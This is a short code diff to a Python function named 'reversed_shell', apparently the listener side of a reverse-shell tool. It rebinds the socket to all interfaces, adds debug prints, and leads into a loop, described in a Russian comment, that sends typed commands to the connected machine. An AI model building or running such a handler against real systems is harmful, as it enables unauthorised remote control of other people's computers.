@@ -84,11 +84,15 @@ def reversed_shell():
     except Exception as e:
         print("Произошла ошибка на этапе определения порта: ", e)
 
-    sock.bind(('', PORT))
-    sock.listen(1)
+    sock.bind(('0.0.0.0', PORT))
+    sock.listen(5)
     conn, addr = sock.accept()
+
+    print("Наш conn: ", conn)
+    print("Наш addr: ", addr)
+
     data = conn.recv(1024)
-    print(data.decode())
+    print("Наша data: ", data.decode())
     #далее проваливаемся в бесконечный цикл посыла команд с выходом по слову quit
     while True:
         cmd = input("waiting for input: ")
